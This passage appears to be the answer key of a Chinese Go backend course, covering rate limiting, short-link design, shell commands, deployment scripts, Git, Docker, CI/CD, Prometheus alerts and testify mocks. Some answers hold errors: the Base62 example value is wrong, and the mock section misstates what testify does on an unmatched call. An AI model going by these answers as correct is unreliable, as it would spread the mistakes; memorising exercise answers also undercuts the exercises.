    pipe := rdb.Pipeline()
    // 1. 删除窗口外的旧记录
    pipe.ZRemRangeByScore(ctx, key, "0", strconv.FormatInt(windowStart, 10))
    // 2. 计数当前窗口内的请求
    pipe.ZCard(ctx, key)
    cmds, err := pipe.Exec(ctx)

    count := cmds[1].(*redis.IntCmd).Val()
    if count >= limit {
        return false, nil
    }

    // 3. 添加当前请求
    rdb.ZAdd(ctx, key, redis.Z{Score: float64(now), Member: strconv.FormatInt(now, 10)})
    rdb.Expire(ctx, key, window)
    return true, nil
}
```

**内存实现**：
```go
type SlidingWindow struct {
    mu       sync.Mutex
    capacity int
    window   time.Duration
    timestamps []time.Time
}

func (sw *SlidingWindow) Allow() bool {
    sw.mu.Lock()
    defer sw.mu.Unlock()

    now := time.Now()
    cutoff := now.Add(-sw.window)

    // 清理过期时间戳
    valid := sw.timestamps[:0]
    for _, ts := range sw.timestamps {
        if ts.After(cutoff) {
            valid = append(valid, ts)
        }
    }
    sw.timestamps = valid

    if len(sw.timestamps) >= sw.capacity {
        return false
    }
    sw.timestamps = append(sw.timestamps, now)
    return true
}
```

**对比**：

| 维度 | 内存实现 | Redis 实现 |
|------|---------|-----------|
| 精度 | 高（微秒级） | 中（毫秒级） |
| 分布式 | 不支持（单实例） | 支持（全局限流） |
| 性能 | 极高 | 高（需网络 IO） |
| 适用场景 | 单实例本地限流 | 分布式网关 / 全局限流 |

**换个角度想**：滑动窗口比固定窗口更平滑——固定窗口在窗口边界处会有 2 倍的突发流量（前一窗口末尾 + 后一窗口开头），滑动窗口则在任何时间点都均匀。

---

## 第98章 · 系统设计

### K-98-1 短链接系统设计

**标准答案**：

**核心表结构**：
```sql
CREATE TABLE short_links (
    id BIGINT PRIMARY KEY AUTO_INCREMENT,
    short_code VARCHAR(10) NOT NULL UNIQUE,
    original_url TEXT NOT NULL,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    expires_at DATETIME,
    INDEX idx_short_code (short_code)
);

CREATE TABLE access_logs (
    id BIGINT PRIMARY KEY AUTO_INCREMENT,
    short_code VARCHAR(10) NOT NULL,
    ip VARCHAR(45),
    user_agent VARCHAR(500),
    accessed_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    INDEX idx_code_time (short_code, accessed_at)
);
```

**短链生成算法**：
```go
// Base62 编码（0-9、A-Z、a-z，共 62 个字符）
func Base62Encode(num int64) string {
    const charset = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
    if num == 0 { return "0" }
    var result []byte
    for num > 0 {
        result = append([]byte{charset[num%62]}, result...)
        num /= 62
    }
    return string(result)
}

// 短链 = Base62(自增ID)
// ID=1000000 → short_code="4c92"
```

**核心流程图**：
```
跳转流程：
1. 用户访问 https://t.cn/4c92
2. Nginx → Go 服务 → 查 Redis 缓存（short_code → original_url）
3. 缓存命中 → 301 重定向
4. 缓存未命中 → 查 MySQL → 写 Redis → 301 重定向
5. 异步记录访问日志到 Kafka/消息队列
```

**容量估算**：
- 日生成 100 万条，年 3.65 亿条
- Base62 6 位 = 568 亿（够用 150 年）
- 存储：每条记录约 500 字节 → 年约 182 GB
- QPS：读为主（99%），峰值约 1 万/s；写峰值约 200/s

---

### K-98-2 高并发短链 ⭐

**标准答案**：

**1. 分布式 ID 生成**：
```go
// 方案：Snowflake 变种
// 不同实例分配不同的 worker_id（从 ZooKeeper/etcd 获取）
type Snowflake struct {
    workerID int64
    sequence int64
    lastTime int64
}

// 或使用预分配号段
// 每个实例从 DB 批量获取号段（如 ID 1~10000），内存中自增
```

为防止短码冲突，短码 = Base62(Snowflake ID)，不依赖自增 ID。

**2. 缓存策略**：
```go
// 多级缓存
func Redirect(ctx context.Context, shortCode string) (string, error) {
    // L1: 本地内存 LRU（10000 条，TTL 60s）
    if url, ok := localCache.Get(shortCode); ok {
        return url, nil
    }
    // L2: Redis（TTL 24h）
    url, err := rdb.Get(ctx, "short:"+shortCode).Result()
    if err == nil { return url, nil }

    // L3: MySQL
    url = db.GetURL(shortCode)
    rdb.Set(ctx, "short:"+shortCode, url, 24*time.Hour)
    return url, nil
}
```

**3. 301 vs 302**：
- **301（永久重定向）**：浏览器缓存重定向，后续访问直接跳目标 URL，不请求短链服务 → 性能好，但无法统计访问量
- **302（临时重定向）**：浏览器每次都会请求短链服务 → 可精确统计，但有性能开销
- **推荐**：用 302（或 307）来保证统计准确性；对流量特别大的用 301 + 嵌入式统计（URL 中嵌入统计参数）

---

## 第99章 · Linux

### K-99-1 常用命令实操

**标准答案**：

```bash
# 1. 查找 /var/log 下大于 100MB 的文件
find /var/log -type f -size +100M

# 2. 统计日志文件中 ERROR 出现次数
grep -c "ERROR" /var/log/app.log
# 或
grep -o "ERROR" /var/log/app.log | wc -l

# 3. 查看 8080 端口被哪个进程占用
lsof -i :8080
# 或
ss -tlnp | grep 8080
# 或
netstat -tlnp | grep 8080

# 4. 后台启动进程，终端关闭后继续运行
nohup ./myapp > app.log 2>&1 &
# 或使用 systemd service

# 5. 查找所有 .go 文件中包含 TODO 的行
grep -rn "TODO" --include="*.go" .

# 6. 实时监控日志文件新增内容
tail -f /var/log/app.log
# 或
tail -n 100 -f /var/log/app.log
```

**换个角度想**：这些命令的组合是运维的基本功。比如「找出占用 8080 端口的进程并 kill」，需要组合 `lsof -ti :8080 | xargs kill -9`。

---

### K-99-2 Shell 一行命令 ⭐

**标准答案**：

```bash
# 1. Nginx 访问日志中访问量 Top 10 的 IP
awk '{print $1}' /var/log/nginx/access.log | sort | uniq -c | sort -rn | head -10

# 2. 将当前目录下所有 .txt 文件中的 foo 替换为 bar
find . -name "*.txt" -exec sed -i 's/foo/bar/g' {} \;
# 或（macOS 用）
find . -name "*.txt" -exec sed -i '' 's/foo/bar/g' {} \;

# 3. 找出两个文件中不同的行
grep -vFf file2.txt file1.txt
# 显示 file1 中有但 file2 中没有的行
# 完整 diff：
comm -3 <(sort file1.txt) <(sort file2.txt)
```

---

## 第100章 · Shell

### K-100-1 自动化部署脚本

**标准答案**：

```bash
#!/bin/bash
set -e

APP_NAME="myapp"
DEPLOY_DIR="/opt/myapp"
BACKUP_DIR="/opt/myapp/backups"

echo "[1/7] Pulling latest code..."
cd "$DEPLOY_DIR"
git pull origin main

echo "[2/7] Building..."
go build -o "${APP_NAME}_new" ./cmd/server/

echo "[3/7] Stopping old process..."
if pgrep -f "$APP_NAME" > /dev/null; then
    pkill -f "$APP_NAME" || true
    sleep 2
fi

echo "[4/7] Backing up old binary..."
mkdir -p "$BACKUP_DIR"
if [ -f "$APP_NAME" ]; then
    cp "$APP_NAME" "$BACKUP_DIR/${APP_NAME}_$(date +%Y%m%d_%H%M%S)"
fi

echo "[5/7] Starting new process..."
mv "${APP_NAME}_new" "$APP_NAME"
chmod +x "$APP_NAME"
nohup ./"$APP_NAME" > app.log 2>&1 &
sleep 3

echo "[6/7] Health check..."
if curl -f http://localhost:8080/health > /dev/null 2>&1; then
    echo "[7/7] Health check passed! Deployment complete."
else
    echo "[7/7] Health check FAILED! Rolling back..."
    LATEST_BACKUP=$(ls -t "$BACKUP_DIR"/${APP_NAME}_* | head -1)
    cp "$LATEST_BACKUP" "$APP_NAME"
    nohup ./"$APP_NAME" > app.log 2>&1 &
    echo "Rollback complete."
    exit 1
fi
```

**解析**：
- `set -e`：任何命令失败（退出码非 0）立即退出脚本。
- `pgrep -f`：按完整命令行匹配进程名。
- 健康检查失败自动回滚：先备份旧文件，启动新进程，curl 验证，失败则恢复旧版本。

**改值实验**：
- **去掉 `sleep 2` 和 `sleep 3`**：旧进程可能还没完全退出，新进程启动时端口冲突失败。
  为什么要注意？→ 进程退出不是瞬间完成的。优雅关停 + sleep 给系统足够的时间释放端口和文件句柄。

---

### K-100-2 多环境部署脚本 ⭐

**标准答案**：

```bash
#!/bin/bash
set -e

ENV=""
while [[ $# -gt 0 ]]; do
    case "$1" in
        --env=*) ENV="${1#*=}"; shift ;;
        *) echo "Usage: $0 --env=[dev|staging|prod]"; exit 1 ;;
    esac
done

if [ -z "$ENV" ]; then
    echo "Error: --env is required"
    exit 1
fi

# 生产环境确认
if [ "$ENV" = "prod" ]; then
    read -p "Deploy to PRODUCTION? Type 'yes' to continue: " confirm
    if [ "$confirm" != "yes" ]; then
        echo "Deployment cancelled."
        exit 0
    fi
fi

# 加载环境特定 .env
ENV_FILE=".env.${ENV}"
if [ ! -f "$ENV_FILE" ]; then
    echo "Error: $ENV_FILE not found"
    exit 1
fi
export $(grep -v '^#' "$ENV_FILE" | xargs)

echo "Deploying to $ENV environment..."

# ... 之前的部署流程 ...

# 记录部署日志
DEPLOY_LOG="deploy_history.log"
echo "$(date '+%Y-%m-%d %H:%M:%S') | $ENV | $(git rev-parse --short HEAD) | $USER" >> "$DEPLOY_LOG"
echo "Deployment recorded in $DEPLOY_LOG"
```

**换个角度想**：多环境部署的核心是「隔离」：不同环境的配置（`.env`）、不同服务器的部署目录、不同级别的安全确认流程。生产环境加人工确认是最低限度的手动卡点。

---

## 第101章 · Git

### K-101-1 分支操作练习

**标准答案**：

```bash
# 1. 创建并切换到 feature/login
git checkout -b feature/login main

# 2. 提交 2 个 commit
echo "login page" > login.html
git add login.html
git commit -m "feat: add login page"

echo "login logic" >> login.html
git add login.html
git commit -m "feat: add login logic"

# 3. 切回 main，创建 hotfix/urgent
git checkout main
git checkout -b hotfix/urgent
echo "fix: critical bug" > fix.txt
git add fix.txt
git commit -m "hotfix: critical security patch"

# 4. 合并 hotfix/urgent → main（fast-forward）
git checkout main
git merge hotfix/urgent
# 因为是 fast-forward，main 指针直接前移

# 5. feature/login rebase 到最新 main
git checkout feature/login
git rebase main
# 如果 README.md 有冲突：
# - Git 会暂停，提示冲突文件
# - 编辑 README.md，解决 <<<< 和 >>>> 标记的冲突
# - git add README.md
# - git rebase --continue

# 6. 查看最终状态
git log --oneline --graph --all
```

**换个角度想**：merge vs rebase：merge 保留完整历史（分叉 + 合并提交），rebase 产生线性历史（看起来像一条直线）。团队规范很重要——不要在公共分支上 rebase（会改变他人依赖的 commit hash）。

---

### K-101-2 冲突解决练习

**标准答案**：

```bash
# 创建冲突场景
git checkout -b branch-a
echo "line from A" > conflict.txt
git add conflict.txt && git commit -m "A's version"

git checkout main
git checkout -b branch-b
echo "line from B" > conflict.txt
git add conflict.txt && git commit -m "B's version"

# merge 触发冲突
git checkout branch-a
git merge branch-b
# CONFLICT in conflict.txt

# 冲突标记：
# <<<<<<< HEAD
# line from A
# =======
# line from B
# >>>>>>> branch-b

# 解决：编辑文件为最终版本
echo "line from A and B merged" > conflict.txt
git add conflict.txt
git commit -m "resolve conflict"

# 放弃 merge 改用 rebase
git merge --abort
git rebase branch-b
# 再次出现冲突，重新解决
git rebase --continue
```

**换个角度想**：冲突不是 Git 的问题，是并发修改的必然结果。解决冲突的核心是「沟通」——你和同事各自改了文件的哪部分？合并后应该是什么样？

---

### K-101-3 Git 工作流 ⭐

**标准答案**：

**GitFlow**：

```
main ─────●────────────●────────────●────
           \          / \          /
release     ●──●──●──●   ●──●──●──●
           /    \
develop ──●──────●──●──●──────●──●──●──
         / \        /
feature ●──●──●──●──●
              \
hotfix         ●──●
```

- **长期分支**：`main`（生产）和 `develop`（开发）
- **feature 分支**：从 develop 创建，完成后合并回 develop（squash merge）
- **release 分支**：从 develop 创建，测试通过后合并到 main 和 develop
- **hotfix 分支**：从 main 创建，修复后合并到 main 和 develop
- **Code Review**：feature → develop 通过 PR，必须至少 1 人 approve

**合并策略**：
- feature → develop：squash merge（整洁历史）
- release → main：merge commit（保留完整发布记录）
- hotfix → main + develop：merge commit

---

## 第102章 · Docker

### K-102-1 Dockerfile 编写

**标准答案**：

```dockerfile
# 编译阶段
FROM golang:1.22-alpine AS builder
WORKDIR /app
COPY go.mod go.sum ./
RUN go mod download
COPY . .
RUN CGO_ENABLED=0 GOOS=linux go build -o /app/server ./cmd/server/

# 运行阶段
FROM alpine:3.19
RUN apk add --no-cache ca-certificates tzdata
ENV TZ=Asia/Shanghai
RUN adduser -D -u 1000 appuser

COPY --from=builder /app/server /app/server
COPY --from=builder /app/config /app/config

USER appuser
WORKDIR /app
EXPOSE 8080

HEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \
    CMD wget --no-verbose --tries=1 --spider http://localhost:8080/health || exit 1

ENTRYPOINT ["./server"]
```

构建和运行：
```bash
docker build -t myapp:v1.0 .
docker run -d -p 8080:8080 --name myapp myapp:v1.0
```

**改值实验**：
- **不用多阶段构建（直接 `golang:1.22` 运行）**：镜像包含 Go 编译器、Git、GCC 等工具，大小从 ~15MB 暴涨到 ~800MB。
  为什么要注意？→ 多阶段构建将编译环境和运行环境隔离，最终镜像只包含运行时必需的二进制文件和依赖。

---

### K-102-2 docker-compose 编排

**标准答案**：

```yaml
version: "3.8"

networks:
  app-network:
    driver: bridge

volumes:
  mysql-data:
  redis-data:

services:
  mysql:
    image: mysql:8.0
    container_name: mysql
    environment:
      MYSQL_ROOT_PASSWORD: ${MYSQL_ROOT_PASSWORD}
      MYSQL_DATABASE: ${MYSQL_DATABASE}
    ports:
      - "3306:3306"
    volumes:
      - mysql-data:/var/lib/mysql
      - ./init.sql:/docker-entrypoint-initdb.d/init.sql
    networks:
      - app-network
    healthcheck:
      test: ["CMD", "mysqladmin", "ping", "-h", "localhost"]
      interval: 10s
      retries: 5

  redis:
    image: redis:7-alpine
    container_name: redis
    ports:
      - "6379:6379"
    volumes:
      - redis-data:/data
    networks:
      - app-network
    healthcheck:
      test: ["CMD", "redis-cli", "ping"]
      interval: 10s
      retries: 5

  app:
    build: .
    container_name: myapp
    ports:
      - "8080:8080"
    depends_on:
      mysql:
        condition: service_healthy
      redis:
        condition: service_healthy
    env_file:
      - .env
    networks:
      - app-network

  nginx:
    image: nginx:alpine
    container_name: nginx
    ports:
      - "80:80"
    volumes:
      - ./nginx.conf:/etc/nginx/nginx.conf
    depends_on:
      - app
    networks:
      - app-network
```

**改值实验**：
- **把 `depends_on: condition: service_healthy` 改成 `depends_on:` 无 condition**：MySQL 容器启动但未就绪，Go 应用连接失败。健康检查确保依赖服务真正可用后才启动当前服务。
  为什么要注意？→ 容器启动 ≠ 服务就绪。MySQL 启动后可能需要几秒才能接受连接。

---

### K-102-3 镜像优化 ⭐

**标准答案**：

**在基础 Go 镜像中构建 → 800MB 的原因**：
- `golang:1.22` 基础镜像约 800MB（含完整 OS + Go 工具链 + Git + GCC）
- 编译产物在镜像中占用额外空间

**优化手段**：
```dockerfile
FROM golang:1.22-alpine AS builder       # alpine 约 120MB
WORKDIR /app
COPY go.mod go.sum ./
RUN go mod download
COPY . .
RUN CGO_ENABLED=0 go build -ldflags="-s -w" -o server ./cmd/server/
# -s -w 去掉调试信息和符号表，减少二进制大小

FROM scratch                                # 空白镜像，0MB
COPY --from=builder /etc/ssl/certs/ca-certificates.crt /etc/ssl/certs/
COPY --from=builder /usr/share/zoneinfo/Asia/Shanghai /etc/localtime
COPY --from=builder /app/server /server
EXPOSE 8080
ENTRYPOINT ["/server"]
```

**优化前后对比**：
| 版本 | 大小 | 手段 |
|------|------|------|
| 原始 | 800MB | golang:1.22 完整镜像 |
| 优化 | 120MB | golang:1.22-alpine |
| 最终 | ~10MB | 多阶段 + scratch + ldflags |
```

```bash
# 分析命令
docker history myapp:original  # 查看每层大小
docker image ls | grep myapp   # 查看总大小
```

**换个角度想**：`scratch` 是最小的合法 Docker 镜像（字面量 0 字节）。但代价是：没有 shell（无法 `docker exec` 进去调试）、没有 CA 证书（无法做 HTTPS 请求）、没有时区文件。根据需求选择 `scratch`、`distroless` 还是 `alpine`。

---

## 第103章 · CI/CD

### K-103-1 GitHub Actions 配置

**标准答案**：

```yaml
name: CI

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Setup Go
        uses: actions/setup-go@v5
        with:
          go-version: '1.22'

      - name: Run go vet
        run: go vet ./...

      - name: Run tests with coverage
        run: go test -race -coverprofile=coverage.out ./...

      - name: Upload coverage
        uses: actions/upload-artifact@v4
        with:
          name: coverage
          path: coverage.out

      - name: Run golangci-lint
        uses: golangci/golangci-lint-action@v4
        with:
          version: latest
```

**换个角度想**：CI 的核心价值是在每次 push/PR 时自动化质量检查。`go vet` 查代码问题，`-race` 查数据竞争，`golangci-lint` 查代码规范，三者互补。

---

### K-103-2 自动化部署流水线 ⭐

**标准答案**：

```yaml
name: CI/CD

on:
  push:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-go@v5
        with: { go-version: '1.22' }
      - run: go test -race ./...
      - run: golangci-lint run ./...

  build-and-deploy:
    needs: test
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Build Docker image
        run: |
          docker build -t myapp:${{ github.sha }} .
          docker tag myapp:${{ github.sha }} myrepo/myapp:latest

      - name: Push to Docker Hub
        run: |
          echo "${{ secrets.DOCKER_PASSWORD }}" | docker login -u "${{ secrets.DOCKER_USERNAME }}" --password-stdin
          docker push myrepo/myapp:${{ github.sha }}
          docker push myrepo/myapp:latest

      - name: Deploy to server
        uses: appleboy/ssh-action@v1
        with:
          host: ${{ secrets.SERVER_HOST }}
          username: ${{ secrets.SERVER_USER }}
          key: ${{ secrets.SSH_PRIVATE_KEY }}
          script: |
            docker pull myrepo/myapp:${{ github.sha }}
            docker stop myapp || true
            docker rm myapp || true
            docker run -d --name myapp -p 8080:8080 myrepo/myapp:${{ github.sha }}

      - name: Smoke test
        run: |
          sleep 10
          curl -f http://${{ secrets.SERVER_HOST }}:8080/health || (
            echo "Smoke test failed! Rolling back..."
            # 回滚脚本...
            exit 1
          )
```

**换个角度想**：CI/CD 流水线的关键设计是「失败隔离」：代码提交 → 测试 → 构建 → 部署，每一步失败都不会影响正在运行的服务。真正的蓝绿部署/滚动更新需要编排工具（Kubernetes）。

---

## 第104章 · 部署

### K-104-1 完整部署流程

**标准答案**：

**1. systemd 服务**：
```ini
[Unit]
Description=My Go Web Application
After=network.target mysql.service redis.service

[Service]
Type=simple
User=appuser
Group=appuser
WorkingDirectory=/opt/myapp
ExecStart=/opt/myapp/server
Restart=always
RestartSec=5
EnvironmentFile=/opt/myapp/.env
StandardOutput=journal
StandardError=journal
SyslogIdentifier=myapp

[Install]
WantedBy=multi-user.target
```

**2. Nginx 配置**：
```nginx
server {
    listen 443 ssl http2;
    server_name yourdomain.com;

    ssl_certificate     /etc/ssl/certs/yourdomain.pem;
    ssl_certificate_key /etc/ssl/private/yourdomain.key;

    location / {
        proxy_pass http://127.0.0.1:8080;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}

server {
    listen 80;
    server_name yourdomain.com;
    return 301 https://$server_name$request_uri;
}
```

**3. 部署命令序列**：
```bash
# 服务器准备
sudo apt update && sudo apt install -y golang mysql-server redis-server nginx

# 部署应用
sudo mkdir -p /opt/myapp
sudo cp server /opt/myapp/
sudo cp .env /opt/myapp/
sudo chown -R appuser:appuser /opt/myapp

# 启动服务
sudo cp myapp.service /etc/systemd/system/
sudo systemctl daemon-reload
sudo systemctl enable myapp
sudo systemctl start myapp

# Nginx
sudo cp nginx.conf /etc/nginx/sites-available/myapp
sudo ln -s /etc/nginx/sites-available/myapp /etc/nginx/sites-enabled/
sudo nginx -t && sudo systemctl reload nginx

# 验证
curl https://yourdomain.com/health
```

---

### K-104-2 零停机部署 ⭐

**标准答案**：

```bash
#!/bin/bash
set -e

NEW_VERSION=$1
HEALTH_CHECK_URL="http://localhost/health"

# 启动新实例（不同端口）
docker run -d --name myapp_$NEW_VERSION -p 9090:8080 myapp:$NEW_VERSION

# 等待健康检查通过
for i in $(seq 1 30); do
    if curl -f http://localhost:9090/health 2>/dev/null; then
        echo "New instance healthy"
        break
    fi
    sleep 2
done

# 更新 Nginx upstream（通过修改配置文件重载）
sed -i "s/server localhost:8080;/server localhost:9090;/" /etc/nginx/nginx.conf
nginx -s reload

# 等待旧实例处理完现有请求（Graceful Shutdown）
sleep 5
docker stop myapp_old
docker rm myapp_old

# 清理
docker tag myapp:$NEW_VERSION myapp:latest
```

**Nginx upstream 滚动更新**：
```nginx
upstream backend {
    # 部署新实例后，注释旧实例、添加新实例
    server localhost:9090;  # new
    # server localhost:8080;  # old (drained)
}
```

**换个角度想**：零停机部署的核心是「先启动新的，再停止旧的」。关键点是：新实例必须通过健康检查才能接管流量，旧实例必须等现有请求完成才能停止。

---

## 第105章 · 监控

### K-105-1 Prometheus + Grafana 基础

**标准答案**：

```go
// 指标定义
var (
    httpRequestsTotal = promauto.NewCounterVec(
        prometheus.CounterOpts{
            Name: "http_requests_total",
            Help: "Total number of HTTP requests",
        },
        []string{"method", "path", "status"},
    )

    httpRequestDuration = promauto.NewHistogramVec(
        prometheus.HistogramOpts{
            Name:    "http_request_duration_seconds",
            Help:    "HTTP request duration in seconds",
            Buckets: prometheus.DefBuckets,
        },
        []string{"method", "path"},
    )

    activeConnections = promauto.NewGauge(
        prometheus.GaugeOpts{
            Name: "active_connections",
            Help: "Current number of active connections",
        },
    )
)

// 中间件
func PrometheusMiddleware() gin.HandlerFunc {
    return func(c *gin.Context) {
        activeConnections.Inc()
        defer activeConnections.Dec()

        start := time.Now()
        c.Next()

        status := strconv.Itoa(c.Writer.Status())
        httpRequestsTotal.WithLabelValues(c.Request.Method, c.FullPath(), status).Inc()
        httpRequestDuration.WithLabelValues(c.Request.Method, c.FullPath()).Observe(time.Since(start).Seconds())
    }
}

// /metrics 端点
func main() {
    r := gin.Default()
    r.GET("/metrics", gin.WrapH(promhttp.Handler()))
    r.Run(":8080")
}
```

`prometheus.yml`：
```yaml
global:
  scrape_interval: 15s

scrape_configs:
  - job_name: 'myapp'
    static_configs:
      - targets: ['localhost:8080']
```

**换个角度想**：Prometheus 的四种指标类型：Counter（只增不减，如请求数）、Gauge（可增可减，如连接数）、Histogram（分布统计，如延迟）、Summary（客户端计算分位数）。

---

### K-105-2 告警规则配置 ⭐

**标准答案**：

`alert.rules.yml`：
```yaml
groups:
  - name: myapp_alerts
    rules:
      - alert: HighErrorRate
        expr: |
          (sum(rate(http_requests_total{status=~"5.."}[5m])) / sum(rate(http_requests_total[5m]))) > 0.05
        for: 5m
        labels:
          severity: critical
        annotations:
          summary: "High error rate (>5%)"
          description: "Error rate is {{ $value | humanizePercentage }}"

      - alert: HighLatency
        expr: histogram_quantile(0.99, rate(http_request_duration_seconds_bucket[5m])) > 1
        for: 5m
        labels:
          severity: warning
        annotations:
          summary: "P99 latency > 1s"

      - alert: ServiceDown
        expr: up{job="myapp"} == 0
        for: 1m
        labels:
          severity: critical
        annotations:
          summary: "Service is down"
```

Alertmanager 配置：
```yaml
route:
  receiver: 'default'
  routes:
    - match:
        severity: critical
      receiver: 'critical'

receivers:
  - name: 'default'
    email_configs:
      - to: 'team@example.com'
  - name: 'critical'
    webhook_configs:
      - url: 'https://hooks.slack.com/services/xxx'
```

---

## 第106章 · 单元测试

### K-106-1 表格驱动测试

**标准答案**：

```go
func TestCalculateDiscount(t *testing.T) {
    tests := []struct {
        name      string
        amount    float64
        userLevel string
        expected  float64
    }{
        {"vip 享受 8 折", 100.0, "vip", 80.0},
        {"svip 享受 7 折", 100.0, "svip", 70.0},
        {"normal >=100 享受 95 折", 100.0, "normal", 95.0},
        {"normal <100 无折扣", 50.0, "normal", 50.0},
        {"边界: normal 刚好 100", 100.0, "normal", 95.0},
        {"边界: normal 99.99 无折扣", 99.99, "normal", 99.99},
        {"未知等级 无折扣", 100.0, "guest", 100.0},
        {"0 元金额", 0.0, "vip", 0.0},
        {"负数金额", -100.0, "vip", -80.0},
    }

    for _, tt := range tests {
        t.Run(tt.name, func(t *testing.T) {
            got := CalculateDiscount(tt.amount, tt.userLevel)
            if got != tt.expected {
                t.Errorf("CalculateDiscount(%f, %s) = %f, want %f",
                    tt.amount, tt.userLevel, got, tt.expected)
            }
        })
    }
}
```

**解析**：
- `t.Run(name, func)`：每个 case 作为独立的子测试运行，互不影响。
- 覆盖类型：正常输入（vip/svip/normal）、边界（刚好 100、0）、异常（负数、未知等级）。
- `name` 字段用中文描述测试场景，失败时一目了然。

**改值实验**：
- **把容忍度加到测试中 (`math.Abs(got-expected) < 0.001`)**：浮点数比较应使用 epsilon 容忍度，因为浮点误差可能导致 `80.0 != 79.99999999`。当前用例使用精确值输入（100.0 * 0.8），碰巧没有浮点误差，但生产代码中应养成容忍度比较的习惯。
  为什么要注意？→ 金融计算建议用 `decimal` 库或缩放为整数（分）后再比较。

---

### K-106-2 测试覆盖率 ⭐

**标准答案**：

```bash
go test -coverprofile=coverage.out ./...
go tool cover -html=coverage.out -o coverage.html
```

覆盖率报告中未覆盖的分支通常为：
1. **数据库错误分支**（需要 mock 或 testcontainers 才能触发）
2. **极端边界条件**（如 `nil` 指针、空切片）
3. **defer 中的 recover 分支**（需要模拟 panic）
4. **第三方 API 超时**（需要 mock HTTP client）

**未覆盖分支的标注与解释**：在覆盖率 HTML 中，红色行表示未覆盖。常见原因：该错误分支在生产环境极少发生，但测试中需要特意构造异常数据。

---

## 第107章 · Mock

### K-107-1 使用 testify 编写 mock 测试

**标准答案**：

```go
package service

import (
    "context"
    "errors"
    "testing"

    "github.com/stretchr/testify/assert"
    "github.com/stretchr/testify/mock"
)

type User struct {
    ID   int64
    Name string
}

type UserRepository interface {
    GetByID(ctx context.Context, id int64) (*User, error)
    Create(ctx context.Context, user *User) error
}

type UserService struct {
    repo UserRepository
}

func (s *UserService) GetUserWithGreeting(ctx context.Context, id int64) (string, error) {
    user, err := s.repo.GetByID(ctx, id)
    if err != nil {
        return "", err
    }
    return "Hello, " + user.Name, nil
}

type MockUserRepository struct {
    mock.Mock
}

func (m *MockUserRepository) GetByID(ctx context.Context, id int64) (*User, error) {
    args := m.Called(ctx, id)
    if args.Get(0) == nil {
        return nil, args.Error(1)
    }
    return args.Get(0).(*User), args.Error(1)
}

func (m *MockUserRepository) Create(ctx context.Context, user *User) error {
    args := m.Called(ctx, user)
    return args.Error(0)
}

func TestGetUserWithGreeting_Success(t *testing.T) {
    mockRepo := new(MockUserRepository)
    svc := &UserService{repo: mockRepo}

    expectedUser := &User{ID: 1, Name: "张三"}
    mockRepo.On("GetByID", mock.Anything, int64(1)).Return(expectedUser, nil)

    greeting, err := svc.GetUserWithGreeting(context.Background(), 1)

    assert.NoError(t, err)
    assert.Equal(t, "Hello, 张三", greeting)
    mockRepo.AssertCalled(t, "GetByID", mock.Anything, int64(1))
    mockRepo.AssertNumberOfCalls(t, "GetByID", 1)
}

func TestGetUserWithGreeting_RepoError(t *testing.T) {
    mockRepo := new(MockUserRepository)
    svc := &UserService{repo: mockRepo}

    mockRepo.On("GetByID", mock.Anything, int64(999)).Return(nil, errors.New("user not found"))

    greeting, err := svc.GetUserWithGreeting(context.Background(), 999)

    assert.Error(t, err)
    assert.Equal(t, "", greeting)
    assert.EqualError(t, err, "user not found")
    mockRepo.AssertCalled(t, "GetByID", mock.Anything, int64(999))
}
```

**解析**：
- `mock.Mock` 嵌入到 `MockUserRepository` 后，自动获得 `On`、`Called`、`AssertCalled` 等方法。
- `On("GetByID", ..., int64(1)).Return(expectedUser, nil)`：注册期望——当 `GetByID` 被调用且 `id=1` 时，返回 `expectedUser` 和 `nil`。`mock.Anything` 表示该参数不限定具体值。
- `AssertNumberOfCalls(t, "GetByID", 1)`：验证方法确实被调用了一次，防止"测试通过但方法根本没调"的假阳性。
- 第二个测试覆盖 repo 报错分支：mock 返回 error，验证 service 正确传递了错误，且 greeting 为空字符串。

**改值实验**：
- **把 `On("GetByID", ..., int64(1))` 的 id 改成 2**：mock 期望 id=2 的调用，但测试代码传入 id=1。此时 `Called` 方法收到 (ctx, 1) 后找不到匹配的期望，返回零值 `(nil, nil)`。`args.Get(0)` 为 nil，mock 返回 `(nil, nil)`，service 中 `user.Name` 引发 **nil pointer dereference panic**。这暴露了"mock 参数不匹配时不会有友好的错误提示"的坑——应使用 `mock.MatchedBy` 或宽松匹配。
- **把 `AssertNumberOfCalls` 注释掉**：如果代码根本没调用 `GetByID`（比如 service 内部写了死逻辑），测试仍会通过（因为 `On/Return` 只是注册期望，不强制调用）。`AssertCalled`/`AssertNumberOfCalls` 是防止这种假阳性的关键。

---

### K-107-2 时间 Mock ⭐

**标准答案**：

**方案一：依赖注入时钟接口**

```go
package service

import (
    "context"
    "time"
)

type Clock interface {
    Now() time.Time
}

type RealClock struct{}
func (RealClock) Now() time.Time { return time.Now() }

type FixedClock struct{ t time.Time }
func (c FixedClock) Now() time.Time { return c.t }

type UserService struct {
    repo  UserRepository
    clock Clock
}

func (s *UserService) IsInCampaign(ctx context.Context, userID int64) (bool, error) {
    user, err := s.repo.GetByID(ctx, userID)
    if err != nil {
        return false, err
    }
    now := s.clock.Now()
    campaignStart := time.Date(2026, 6, 1, 0, 0, 0, 0, time.UTC)
    campaignEnd := time.Date(2026, 6, 30, 23, 59, 59, 0, time.UTC)
    return now.After(campaignStart) && now.Before(campaignEnd), nil
}

// 测试
func TestIsInCampaign(t *testing.T) {
    mockRepo := new(MockUserRepository)
    mockRepo.On("GetByID", mock.Anything, int64(1)).Return(&User{ID: 1, Name: "test"}, nil)

    // 注入固定时间：2026-06-15（活动期内）
    fixedClock := FixedClock{t: time.Date(2026, 6, 15, 12, 0, 0, 0, time.UTC)}
    svc := &UserService{repo: mockRepo, clock: fixedClock}

    in, err := svc.IsInCampaign(context.Background(), 1)
    assert.NoError(t, err)
    assert.True(t, in)

